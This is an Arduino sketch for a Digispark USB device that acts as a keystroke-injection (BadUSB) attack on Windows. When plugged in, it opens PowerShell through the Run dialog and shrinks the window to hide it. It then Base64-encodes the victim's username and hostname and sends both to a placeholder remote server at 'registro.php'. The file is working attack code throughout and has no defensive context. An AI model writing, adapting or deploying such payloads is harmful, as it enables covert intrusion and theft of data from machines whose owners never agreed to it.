#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("mode 15,1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell iwr -Uri (\"http://x.x.x.x/registro.php");
  DigiKeyboard.sendKeyStroke(0, MOD_ALT_RIGHT);
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_ALT_RIGHT);
  DigiKeyboard.sendKeyStroke(0, 0);
  DigiKeyboard.print("p1=\" + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami))) + \"'&'p2=\" + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((hostname)))); exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*empty*/
  }
}
